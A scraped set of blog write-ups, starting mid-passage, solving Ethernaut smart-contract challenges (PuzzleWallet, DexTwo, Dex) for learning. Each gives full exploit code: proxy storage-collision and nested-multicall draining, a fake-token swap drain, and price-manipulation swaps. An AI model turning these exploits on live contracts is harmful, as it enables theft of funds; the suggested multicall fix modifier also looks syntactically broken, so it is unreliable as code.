PuzzleWallet. PuzzleProxy inherits the UpgradeableProxy contract. Here, they have implemented upgradable logic for the PuzzleProxy contract. PuzzleProxy contract is similar to our State_contract, and PuzzleWallet contract is similar to our Logic_contract. The function logics are written in the PuzzleWallet contract, and state changes are done in the PuzzleProxy contract.\nIf you have skipped the concepts part, you might not know what State_contract and Logic_contract are.\nClick here to view the UpgradeableProxy contract.\nThe UpgradeableProxy contract constructor takes two arguments: the logic contract address and the init data as input. The constructor in UpgradeableProxy makes a delegate call to the logic contract with the init data passed to the constructor. I will briefly explain UpgradeableProxy in the concepts part.\nThe main difference between the example I have explained and the PuzzleProxy contract is the implementation of the logic contract in the state contract.\nIn our example, we have written functions in our State_contract, and those functions will make a delegate call to the Logic_contract. But here, since they are using the UpgradeableProxy contract, it will make a delegate call in a different way. When someone calls the PuzzleProxy contract with some data that doesn\u0026rsquo;t match any function selector in the PuzzleProxy contract, then if there is a fallback() function in the PuzzleProxy contract, the call made will reach the fallback() function, and the logic in the fallback() function will execute. PuzzleProxy will make a delegate call to PuzzleWallet when the fallback() function is hit.\n1 2 function _delegate(address implementation) internal { 3 // solhint-disable-next-line no-inline-assembly 4 assembly { 5 // Copy msg.data. We take full control of memory in this inline assembly 6 // block because it will not return to Solidity code. We overwrite the 7 // Solidity scratch pad at memory position 0. 8 calldatacopy(0, 0, calldatasize()) 9 10 // Call the implementation. 11 // out and outsize are 0 because we don\u0026#39;t know the size yet. 12 let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) 13 14 // Copy the returned data. 15 returndatacopy(0, 0, returndatasize()) 16 17 switch result 18 // delegatecall returns 0 on error. 19 case 0 { revert(0, returndatasize()) } 20 default { return(0, returndatasize()) } 21 } 22} 23 24 25function _fallback() internal { 26 _beforeFallback(); 27 _delegate(_implementation()); 28} The above code is from proxy contract which is inherited by UpgradeableProxy contract. If the above code doesn\u0026rsquo;t make sense don\u0026rsquo;t think much of it. Basically it will copy the calldata and makes delegate call to implemntation(PuzzleWallet) contract.\nNow i will explain in detail of PuzzleProxy and PuzzleWallet contracts.\nThe PuzzleProxy contract has two state variables named pendingAdmin and admin of type address.\n1constructor(address _admin, address _implementation, bytes memory _initData) 2 UpgradeableProxy(_implementation, _initData) 3 { 4 admin = _admin; 5 } The constructor of PuzzleProxy takes three arguments: _admin (address), _implementation (address), and _initData (bytes memory). It calls the constructor of UpgradeableProxy by passing the implementation address and init data as input. Then it sets the admin to _admin passed during the call.\n1modifier onlyAdmin() { 2 require(msg.sender == admin, \u0026#34;Caller is not the admin\u0026#34;); 3 _; 4} The modifier onlyAdmin() checks whether the msg.sender (caller) is the admin or not.\n1function proposeNewAdmin(address _newAdmin) external { 2 pendingAdmin = _newAdmin; 3} The function proposeNewAdmin() takes an argument of type address (_newAdmin) as input and sets the pendingAdmin to _newAdmin.\n1function approveNewAdmin(address _expectedAdmin) external onlyAdmin { 2 require(pendingAdmin == _expectedAdmin, \u0026#34;Expected new admin by the current admin is not the pending admin\u0026#34;); 3 admin = pendingAdmin; 4} The function approveNewAdmin() takes an argument of type address (_expectedAdmin) as input. It checks whether the _expectedAdmin and pendingAdmin are the same or not. If they match, then admin will be set to pendingAdmin. If they don\u0026rsquo;t match, the function will revert. This function has a modifier onlyAdmin, which means the function can only be called by the admin. If someone else tries to call this function, it will revert.\n1function upgradeTo(address _newImplementation) external onlyAdmin { 2 _upgradeTo(_newImplementation); 3} The function upgradeTo() takes an argument of type address as input and executes the modifier onlyAdmin. If the modifier is passed, it will upgrade the implementation contract.\nNow, I will explain only one important function of the PuzzleWallet contract. The other functions are understandable.\n1 2function multicall(bytes[] calldata data) external payable onlyWhitelisted { 3 bool depositCalled = false; 4 for (uint256 i = 0; i \u0026lt; data.length; i++) { 5 bytes memory _data = data[i]; 6 bytes4 selector; 7 assembly { 8 selector := mload(add(_data, 32)) 9 } 10 if (selector == this.deposit.selector) { 11 require(!depositCalled, \u0026#34;Deposit can only be called once\u0026#34;); 12 // Protect against reusing msg.value 13 depositCalled = true; 14 } 15 (bool success,) = address(this).delegatecall(data[i]); 16 require(success, \u0026#34;Error while delegating call\u0026#34;); 17 } 18} The function multicall() takes a bytes array as input and executes the modifier onlyWhitelisted. If the modifier is passed, for each data in the array, the function will make a delegate call to the same contract with the data as each element of the array.\nExploit Our task is to become admin of the PuzzleProxy contract. If we open the instance address in block explorer we can find that the instance is having 0.001 amount of ether. Now let\u0026rsquo;s start exploiting the contract.\n1\u0026gt; contract.abi If we enter the contract.abi we can find all the functions of PuzzleWallet contract. Now we may think that the given instance is an instance of PuzzleWallet contract. But it is not. They have given us the instance of PuzzleProxy contract and they just spoofed the abi of PuzzleWallet contract.\nSo all the state variables reading and writing will be done in PuzzleProxy contract and logic execution part will be done on PuzzleWallet contract.\n1 2function proposeNewAdmin(address _newAdmin) external { 3 pendingAdmin = _newAdmin; 4} 5 6function approveNewAdmin(address _expectedAdmin) external onlyAdmin { 7 require(pendingAdmin == _expectedAdmin, \u0026#34;Expected new admin by the current admin is not the pending admin\u0026#34;); 8 admin = pendingAdmin; 9} Our task is become admin of the PuzzleProxy contract but if we see the PuzzleProxy contract anyone can propose the new admin but it will be only aprooved by the present admin. Since we are not the admin of the PuzzleProxy contract we won\u0026rsquo;t be able to change the admin. So we need to think any different approach.\nIf we check the storage layout of PuzzleProxy and PuzzleWallet, we can see that both layouts are not the same. They are completely different. Even though they are different, the PuzzleWallet must have all the state variables of the PuzzleProxy contract, but both layouts are different. Since the PuzzleProxy contract makes a delegate call to the PuzzleWallet contract, we can exploit this discrepancy.\nIf we somehow change the maxBalance in PuzzleWallet during the delegate call, it will change the address of the admin in the PuzzleProxy contract.\nDuring the delegate call in the sense, when we make a call to the PuzzleProxy contract with some data that matches the function selector of the PuzzleWallet contract, the PuzzleProxy will make a delegate call to the function that matches the function selector.\nOur target is to change maxBalance.\n1 2function init(uint256 _maxBalance) public { 3 require(maxBalance == 0, \u0026#34;Already initialized\u0026#34;); 4 maxBalance = _maxBalance; 5 owner = msg.sender; 6} 7 8function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { 9 require(address(this).balance == 0, \u0026#34;Contract balance is not 0\u0026#34;); 10 maxBalance = _maxBalance; 11} The maxBalance is only changed in these two functions. It is not possible to change the maxBalance by calling init() because when PuzzleProxy makes a delegate call to PuzzleWallet and calls init(), the maxBalance will be the address of the admin converted to uint256 and it won\u0026rsquo;t be equal to zero. So we won\u0026rsquo;t be able to call init(). In a delegate call, state variable readings and writings will be done on the caller contract.\nThe only way we can change maxBalance is by calling setMaxBalance(). However, there is a modifier onlyWhitelisted. In order to set maxBalance, we need to pass the modifier and drain the balance of the contract. The modifier will check whether the msg.sender is whitelisted or not. Here, msg.sender won\u0026rsquo;t be the address of PuzzleProxy; it will be the address of the caller who is calling PuzzleProxy because in a delegate call, msg.sender and msg.value will be passed as the same.\n1function addToWhitelist(address addr) external { 2 require(msg.sender == owner, \u0026#34;Not the owner\u0026#34;); 3 whitelisted[addr] = true; 4} The above function will add the address passed to the whitelist. However, only the owner can call this function. The owner state variable is stored in slot0. In the PuzzleProxy contract, slot0 stores pendingAdmin. Since anyone can propose the admin, if we propose our Exploit contract as the admin, then the exploit contract address will be stored as pendingAdmin.\nAfter making pendingAdmin our exploit contract, we will be able to call addToWhitelist() in the PuzzleWallet contract. This is because we are interacting with PuzzleProxy, and PuzzleProxy is making a delegate call to PuzzleWallet. When the logic in PuzzleWallet reads some state variables, these state variables will be read from the PuzzleProxy contract.\nOnce we set the pendingAdmin to our exploit contract address, we will become the owner. The setMaxBalance() function also has an additional check to see if the contract balance is zero. So, we need to make the contract balance zero. Once this is done, we can change the maxBalance, which means we are changing the admin.\n1function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted { 2 require(balances[msg.sender] \u0026gt;= value, \u0026#34;Insufficient balance\u0026#34;); 3 balances[msg.sender] -= value; 4 (bool success,) = to.call{value: value}(data); 5 require(success, \u0026#34;Execution failed\u0026#34;); 6 } The only way we can withdraw ether from the PuzzleProxy contract is by calling execute() in the PuzzleWallet. This function checks if we have sufficient balance to withdraw. If we have sufficient balance, then we can withdraw. Before withdrawing, we need to deposit some ether into the contract.\n1function deposit() external payable onlyWhitelisted { 2 require(address(this).balance \u0026lt;= maxBalance, \u0026#34;Max balance reached\u0026#34;); 3 balances[msg.sender] += msg.value; 4} The deposit() function in PuzzleWallet will check if the current balance of the PuzzleProxy contract is less than maxBalance. If it is less, then it updates the balance of msg.sender with msg.value.\nThe functions deposit() and execute() work normally, and we can\u0026rsquo;t find many exploits there. However, there is one more way we can deposit ether: by calling multicall() with the data as the deposit() function selector. Now, let\u0026rsquo;s deep dive into the multicall() function.\n1function multicall(bytes[] calldata data) external payable onlyWhitelisted { 2 bool depositCalled = false; 3 for (uint256 i = 0; i \u0026lt; data.length; i++) { 4 bytes memory _data = data[i]; 5 bytes4 selector; 6 assembly { 7 selector := mload(add(_data, 32)) 8 } 9 if (selector == this.deposit.selector) { 10 require(!depositCalled, \u0026#34;Deposit can only be called once\u0026#34;); 11 // Protect against reusing msg.value 12 depositCalled = true; 13 } 14 (bool success,) = address(this).delegatecall(data[i]); 15 require(success, \u0026#34;Error while delegating call\u0026#34;); 16 } 17} The above function takes a bytes array as input, and for each element in the array, it will get the function selector and check if the selector is the selector of the deposit() function. If it is deposit(), it will set depositCalled to true and then call deposit() using the delegate call. This check is important due to the properties of delegate call.\nAssume there are three contracts: contract_1, contract_2, and contract_3. If we call a function in contract_1 and that function makes a delegate call to contract_2, and then the function in contract_2 makes a delegate call to contract_3, what will be the msg.sender and msg.value in contract_3? They will be the msg.sender and msg.value of contract_1.\nIn the multicall function, if we try to call the deposit() function twice by passing its function selector in the data array, the transaction will revert. This is because depositCalled is initially set to false. When deposit() is called for the first time, depositCalled is set to true. On the second iteration, when deposit() is called again, the require statement will fail since depositCalled is now true, causing the transaction to revert with the message \u0026ldquo;Deposit can only be called once\u0026rdquo;.\nWhen someone wants to deposit two ether by sending only one ether, they might try to call the multicall() function by passing the function selector of deposit() in the data array twice. However, due to the require statement that checks if depositCalled is false, the transaction will revert on the second call. This prevents depositing twice with a single amount. If there were no require statement, it would be possible because multicall() is making a delegate call to deposit(), and the msg.sender and msg.value would be the same for each call. Check the below image.\nAssume there is no require statment and Suppose if we invoke multicall() with 1ether and data as function selector of deposit() twice then for the first time it will call deposit() and msg.value will be 1 ether and second time it will again call deposit() and msg.value will be 1 ether. So technically we made our balances as 2 ether by depositing 1 ether.\nDue to the require statement, we can\u0026rsquo;t call deposit() twice directly. However, if we pass the calldata to invoke deposit() as the first element of the data array, and then pass the calldata to invoke multicall() with the argument as calldata to invoke deposit(), we can bypass the require check. This way, we can set our balance to 2 ether by sending only 1 ether.\nNow, if we check the balance of the PuzzleProxy contract, it is 0.001 ether. So, we need to deposit 0.001 ether to make our balance 0.002 ether and then withdraw all the ether.\nNow let\u0026rsquo;s write our exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4interface IProxy{ 5 function proposeNewAdmin(address) external; 6 function approveNewAdmin(address) external ; 7 function setMaxBalance(uint256) external; 8 function addToWhitelist(address) external; 9 function deposit() external payable ; 10 function execute(address, uint256, bytes calldata) external payable; 11 function multicall(bytes[] calldata) external payable; 12 function admin()external view returns(address); 13} 14 15 16 17contract ExploitPuzzleProxy{ 18 IProxy proxy; 19 address player; 20 constructor(address _proxy){ 21 proxy=IProxy(_proxy); 22 player=msg.sender; 23 } 24 25 function Exploit()public payable{ 26 proxy.proposeNewAdmin(address(this)); 27 proxy.addToWhitelist(address(this)); 28 29 bytes[] memory main_data=new bytes[](2); 30 bytes[] memory second_deposit=new bytes[](1); 31 second_deposit[0]=abi.encodeWithSignature(\u0026#34;deposit()\u0026#34;); 32 33 main_data[0]=second_deposit[0]; 34 main_data[1]=abi.encodeWithSignature(\u0026#34;multicall(bytes[])\u0026#34;,second_deposit); 35 36 proxy.multicall{value:0.001 ether}(main_data); 37 proxy.execute(player,0.002 ether,\u0026#34;\u0026#34;); 38 uint256 Player_Address=uint256(uint160(player)); 39 proxy.setMaxBalance(Player_Address); 40 require(proxy.admin()==player, \u0026#34;Exploit Failed\u0026#34;); 41 } 42} Deploy this contract and call the exploit function by sending 0.001 ether or 1000000000000000 wei. Once the call is done the challenge will be solved.\nThat\u0026rsquo;s it for this challenge see you in the next challenge.\nIf you are a beginner to blockchain and understanding this challenge, it\u0026rsquo;s a really great thing. Be proud of yourself.\nKey Takeaways Whenever we implement upgradable contracts, we need to be very careful while designing the storage layout. The logic contract and state variables contract should have the same storage layout. In this challenge, a major part of the exploit was due to the storage layout.\nIn order to safeguard the multicall, we need to write a modifier that handles the inner call to multicall.\n1 2modifier Handle_Deposit(address _depositer,bytes[] _calldata){ 3 bytes4 memory data = abi.encodeWithSelector(this.multicall.selector); 4 for(uint i=0;i\u0026lt;_calldata.length;i++){ 5 if(keccak256(abi.encodePacked(bytes4(_calldata[i])))==keccak256(abi.encodePacked(data))){ 6 revert(\u0026#34;Calling multicall is not allowed here\u0026#34;); 7 } 8 } 9 _; 10} ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/puzzlewallet/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Delegate Call","url":"/tags/delegate-call/"}],"timestamp":1729626493,"title":"PuzzleWallet"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Dex Two Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description This level will ask you to break DexTwo, a subtly modified Dex contract from the previous level, in a different way.\nTo succeed in this level, you need to drain all balances of token1 and token2 from the DexTwo contract.\nYou will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.\nThings that might help:\nHow has the swap method been modified?\nContract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5import \u0026#34;openzeppelin-contracts-08/token/ERC20/IERC20.sol\u0026#34;; 6import \u0026#34;openzeppelin-contracts-08/token/ERC20/ERC20.sol\u0026#34;; 7import \u0026#34;openzeppelin-contracts-08/access/Ownable.sol\u0026#34;; 8 9contract DexTwo is Ownable { 10 address public token1; 11 address public token2; 12 13 constructor() {} 14 15 function setTokens(address _token1, address _token2) public onlyOwner { 16 token1 = _token1; 17 token2 = _token2; 18 } 19 20 function add_liquidity(address token_address, uint256 amount) public onlyOwner { 21 IERC20(token_address).transferFrom(msg.sender, address(this), amount); 22 } 23 24 function swap(address from, address to, uint256 amount) public { 25 require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); 26 uint256 swapAmount = getSwapAmount(from, to, amount); 27 IERC20(from).transferFrom(msg.sender, address(this), amount); 28 IERC20(to).approve(address(this), swapAmount); 29 IERC20(to).transferFrom(address(this), msg.sender, swapAmount); 30 } 31 32 function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) { 33 return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))); 34 } 35 36 function approve(address spender, uint256 amount) public { 37 SwappableTokenTwo(token1).approve(msg.sender, spender, amount); 38 SwappableTokenTwo(token2).approve(msg.sender, spender, amount); 39 } 40 41 function balanceOf(address token, address account) public view returns (uint256) { 42 return IERC20(token).balanceOf(account); 43 } 44} 45 46contract SwappableTokenTwo is ERC20 { 47 address private _dex; 48 49 constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) 50 ERC20(name, symbol) 51 { 52 _mint(msg.sender, initialSupply); 53 _dex = dexInstance; 54 } 55 56 function approve(address owner, address spender, uint256 amount) public { 57 require(owner != _dex, \u0026#34;InvalidApprover\u0026#34;); 58 super._approve(owner, spender, amount); 59 } 60} If we compare the Dex contract and DexTwo contract, we can see that almost everything is the same except for the swap() function.\n1function swap(address from, address to, uint256 amount) public { 2 require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); 3 uint256 swapAmount = getSwapAmount(from, to, amount); 4 IERC20(from).transferFrom(msg.sender, address(this), amount); 5 IERC20(to).approve(address(this), swapAmount); 6 IERC20(to).transferFrom(address(this), msg.sender, swapAmount); 7} The difference between the swap() function in the Dex contract and the DexTwo contract is that the Dex contract only allows swapping between token1 and token2, while the DexTwo contract allows swapping with any tokens. The Dex contract has a check require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026quot;Invalid tokens\u0026quot;); in the swap() function, which ensures that swapping only occurs between the two specified tokens.\nApart from this difference, everything else is the same in the Dex and DexTwo contracts.\nExploit Since the swap() function allows swapping between any tokens, we can create a new ERC20 token and swap it with our token to obtain token1 and token2.\nNow, let\u0026rsquo;s examine the swapAmount calculation: ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))). When we swap with our token, the from parameter will be our token address. Initially, the DexTwo contract won\u0026rsquo;t have any Exploit tokens that we created. Therefore, we need to send the Exploit tokens to the DexTwo contract. If we call swap() without sending tokens, the swapAmount will be zero because (amount * IERC20(to).balanceOf(address(this)))/0=0.\nTo solve this, we need to mint some Exploit tokens to the DexTwo contract before calling swap(). Let\u0026rsquo;s mint 1 token to DexTwo.\nNow, we can swap our Exploit token with one of the tokens. However, before doing so, we need to calculate the amount to send such that getSwapAmount() will return 100.\nNow, DexTwo has one Exploit token, 100 token1 tokens, and 100 token2 tokens. Let\u0026rsquo;s calculate:\ntoken1 token2 Exploit token DexTwo 100 100 1 amount (amount to be transferred) * 100 (Number of token1 tokens in Exploit contract) / 1 (Number of Exploit tokens in Exploit contract) = 100 (swapAmount) =\u0026gt; amount * 100 / 1 = 100, so the amount will be amount = 100 / 100 = 1. We need to swap our one Exploit token with 100 token1 tokens.\nOnce the first swap is completed between our Exploit token and token1 tokens, we need to swap between our Exploit token and token2 tokens.\nNow, DexTwo has two Exploit tokens, 100 token1 tokens, and 100 token2 tokens. Let\u0026rsquo;s calculate the amount:\ntoken1 token2 Exploit token DexTwo 0 100 2 amount (amount to be transferred) * 100 (Number of token2 tokens in Exploit contract) / 2 (Number of Exploit tokens in Exploit contract) = 100 (swapAmount) =\u0026gt; amount * 100 / 2 = 100, so the amount will be amount = 2 / 1 = 2. We need to swap our two Exploit tokens with 100 token2 tokens.\nOnce the swap is done, the challenge will be solved.\nBefore calling swap(), we need to make sure that we have approved the DexTwo contract to spend tokens on behalf of our Exploit contract address. This is because when we call swap(), it will transfer our Exploit tokens using transferFrom().\nWe need to approve the DexTwo contract to transfer three tokens on behalf of our Exploit contract: one token for the first swap and two tokens for the second swap.\nThe following is the Exploit contract:\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {ERC20} from \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; 5 6interface IdexTwo { 7 function swap(address, address, uint256) external; 8 function approve(address , uint256 ) external; 9 function balanceOf(address, address) external view returns (uint256) ; 10} 11 12 13contract ExploitDexTwo is ERC20(\u0026#34;Exploit\u0026#34;,\u0026#34;EX\u0026#34;){ 14 IdexTwo dexTwo; 15 address token1=//__YOUR__INSTANCE__TOKEN1__ADDRESS; 16 address token2=//__YOUR__INSTANCE__TOKEN2__ADDRESS; 17 constructor(address _addr){ 18 dexTwo=IdexTwo(_addr); 19 _mint(address(this),3); 20 } 21 22 23 function Exploit()public{ 24 _approve(address(this), address(dexTwo),3); 25 _mint(address(dexTwo),1); 26 dexTwo.swap(address(this),token1,1); 27 dexTwo.swap(address(this),token2,2); 28 } 29} Once you deploy the contract and call the Exploit() function, the challenge will be solved.\nKey Takeaways When building DEX contracts, it is important to ensure that swaps occur only between the expected tokens. Allowing every token for swapping can result in valuable tokens in the DEX contract being swapped with less valuable tokens, leading to losses for the DEX owner.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/dextwo/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Decentralized Exchange","url":"/tags/decentralized-exchange/"}],"timestamp":1729626443,"title":"DexTwo"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Dex Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.\nYou will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a \u0026ldquo;bad\u0026rdquo; price of the assets.\nContract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5import \u0026#34;openzeppelin-contracts-08/token/ERC20/IERC20.sol\u0026#34;; 6import \u0026#34;openzeppelin-contracts-08/token/ERC20/ERC20.sol\u0026#34;; 7import \u0026#34;openzeppelin-contracts-08/access/Ownable.sol\u0026#34;; 8 9contract Dex is Ownable { 10address public token1; 11address public token2; 12 13 constructor() {} 14 15 function setTokens(address _token1, address _token2) public onlyOwner { 16 token1 = _token1; 17 token2 = _token2; 18 } 19 20 function addLiquidity(address token_address, uint256 amount) public onlyOwner { 21 IERC20(token_address).transferFrom(msg.sender, address(this), amount); 22 } 23 24 function swap(address from, address to, uint256 amount) public { 25 require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); 26 require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); 27 uint256 swapAmount = getSwapPrice(from, to, amount); 28 IERC20(from).transferFrom(msg.sender, address(this), amount); 29 IERC20(to).approve(address(this), swapAmount); 30 IERC20(to).transferFrom(address(this), msg.sender, swapAmount); 31 } 32 33 function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) { 34 return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))); 35 } 36 37 function approve(address spender, uint256 amount) public { 38 SwappableToken(token1).approve(msg.sender, spender, amount); 39 SwappableToken(token2).approve(msg.sender, spender, amount); 40 } 41 42 function balanceOf(address token, address account) public view returns (uint256) { 43 return IERC20(token).balanceOf(account); 44 } 45 46} 47 48contract SwappableToken is ERC20 { 49address private \\_dex; 50 51 constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) 52 ERC20(name, symbol) 53 { 54 _mint(msg.sender, initialSupply); 55 _dex = dexInstance; 56 } 57 58 function approve(address owner, address spender, uint256 amount) public { 59 require(owner != _dex, \u0026#34;InvalidApprover\u0026#34;); 60 super._approve(owner, spender, amount); 61 } 62 63} They gave us a DEX contract. DEX refers to Decentralized Exchange where we can do financial ativities such as swapping tokens.\nThe contract inherits Ownable contract. Click here to view the Ownable contract.\nThe Ownable contract has the state variable owner and it is initialized to msg.sender in constructor(). That mean\u0026rsquo;s owner will be the person one who is deploying the Dex contract.\nThe Dex contract has two state variables token1 and token2. Both the state variables are of type address.\n1function setTokens(address \\_token1, address \\_token2) public onlyOwner { 2token1 = \\_token1; 3token2 = \\_token2; 4} This function will set the address of token1 and token2.\n1function addLiquidity(address token_address, uint256 amount) public onlyOwner { 2 IERC20(token_address).transferFrom(msg.sender, address(this), amount); 3} The above function addLiquidity() will take two arguments of type address (token_address) and uint256 (amount) as input. Basically the function will add more tokens of the token_address passed during the call. It can be only called by owner because it has onlyOwner modifier.\nSince the Dex contract is a Decentralized Exchange used for swapping tokens, there should be at least two tokens accepted in the Dex contract. Suppose the Dex contract accepts two tokens, token1 and token2, for exchange. If people swap token2 for token1 and all of token1 is depleted in the Dex contract, it can no longer facilitate swaps. Therefore, when one of the tokens becomes very scarce, the owner will add more of the scarce token to ensure the Dex continues to function.\n1function swap(address from, address to, uint256 amount) public { 2 require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); 3 require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); 4 uint256 swapAmount = getSwapPrice(from, to, amount); 5 IERC20(from).transferFrom(msg.sender, address(this), amount); 6 IERC20(to).approve(address(this), swapAmount); 7 IERC20(to).transferFrom(address(this), msg.sender, swapAmount); 8} The above function swap() will take three arguments of type address (from), address (to), uint256 (amount) as input. In the logic part first it will check whether the swapping is done between the allowed tokens (token1 and token2) or not. If the users use any other token for swapping which is not allowed by Dex contract then it will revert. Then it checks whether the user is having the tokens they are swapping or not. Then it will get the swapAmount using the function getSwapPrice() .\nswapAmount is basically when user wants to swaps token1 with token2 they will send token1 to Dex contract and Dex contract will send the user token2. But the number of tokens sent by user and the number of tokens sent by Dex contract won\u0026rsquo;t be same because the price of token1 and token2 might not be same. Based on the price difference getSwapPrice() will return the number of token2 user will get for swapping with toke`n1.\n1function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) { 2 return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))); 3} The above function getSwapPrice() will return then number of tokens user will get for swapping with another type of tokens.\n1function approve(address spender, uint256 amount) public { 2 SwappableToken(token1).approve(msg.sender, spender, amount); 3 SwappableToken(token2).approve(msg.sender, spender, amount); 4} The function approve() takes two arguments: an address (spender) and a uint256 (amount). The function calls the approve function in the SwappableToken contract. SwappableToken is a basic ERC20 contract. The approve function in the Dex contract calls the approve function in the SwappableToken contract, passing msg.sender, spender, and amount as arguments. This allows the spender to spend the specified amount on behalf of msg.sender for both the tokens.\n1function balanceOf(address token, address account) public view returns (uint256) { 2 return IERC20(token).balanceOf(account); 3} The above function balanceOf() will take two arguments of type address(token) and address(account) as input . The function will return the balance of the account in token passed.\nKey Concepts To Learn Before starting to solve this challenge we need to make sure that we have a good understanding of ERC20 tokens.\nI have explained about ERC20 contract in the Token challenge. Click here to open the WriteUp for that challenge.\nExploit In the challenge we was given 10 tokens of token1 and token2 and the Dex contract is having 100 tokens of token1 and token2. Our task is drain one of the token balance of Dex contract.\nAfter looking into the Dex contract, I felt like everything is working fine except the getSwapPrice() function. If we see the getSwapPrice() function, we can find that the logic the function uses is not correct to get the swapAmount.\nThe formulae for calculating swapAmount is ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))).\nWhen we swap our 10 token1 for token2 we will get 10 token2 based on the getSwapPrice() function. Now we have 0 token1 and 20 token2. The next time when we swap our 20 token2 for token1 we will get 24 token1 . The next time when we swap 24 token1 for token2 we will get 30 tokens. So on it will continue. Check the below image to view how swapAmount is manipulated in each swap.\nFirst we will swap 10 token1 and we get 10 token2. swapAmount is (10* 100/100)=10 so we get 10 token2. After this swap Dex contract has 110 token1 and 90 token2.\nFor second time we swap our 20 token2 and we will get 24 token1. swapAmount is (20* 110/90)=24. So we get 24 token1. After this swap Dex contract has 86 token1 and 110 token2.\nFor the third time we swap our 24 token1 and we will get 30 token2. swapAmount is (24*110/86)=30. So we get 30 token2 After this swap Dex contract has 110 token1 and 80 token2.\nFor the fourth time we swap our 30 token2 and we will get 41 token1. swapAmount is (30 *110/80)=41. So we will get 41 tokens1. After this swap, Dex contract has 69 token1 and 110 token2.\nFor the fifth time we swap our 41 token1 and we will get 65 token2. swapAmount is (41*110/69)=65. So we will get 65 token2. After this swap Dex contract has 110 token1 and 45 token2.\nFor the sixth time we swap only 45 token2 and we will get 110 token1 . swapAmount is (45*110/45)=110. So we will get 110 token1. After this swap, Dex contract has 0 token1 and 90 token2.\nDuring the sixth swap, we only swap 45 token2 because if we swap more than 45 then swapAmount will be more than the Dex contract balance. Suppose we swap 50 token2 then we will get swapAmount as (50*110/45)=122 122 token1 which means in return we will get 122 token2 but the Dex contract only has 110 token2. So it will revert if we try to swap more than 45 token2 in the last call.\nNow lets exploit the contract.\nBefore calling swap() function we need to make sure that we have allowed the Dex contract to send tokens on our behalf because when we swap token1 for token2 we are sending our token1 to the Dex contract and the Dex contract will send us token2. But we are not directly transfering the ether instead the Dex contract uses transferFrom() to receive our tokens.\nIERC20(from).transferFrom(msg.sender, address(this), amount) you can find this line in swap() function.\nNow it\u0026rsquo;s time to open the console. Open Dex challenge and enter ctrl+shift+j to open the console.\n1\u0026gt; await contract.approve(contract.address,1000) 1\u0026gt; token1=await contract.token1() 2\u0026gt; token2=await contract.token2() 1\u0026gt; await contract.swap(token1,token2,10) 1\u0026gt; await contract.swap(token2,token1,20) 1\u0026gt; await contract.swap(token1,token2,24) 1\u0026gt; await contract.swap(token2,token1,30) 1\u0026gt; await contract.swap(token1,token2,41) 1\u0026gt; await contract.swap(token2,token1,45) Once the above calls are done the Dex contracts token1 balance will be zero. We can verify it by the following.\n1\u0026gt; (await contract.balanceOf(token1,contract.address)).toString() Now you can submit the level instance.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\nKey Takeaways Single Source Data Vulnerability: Relying on a single source for prices or any data in 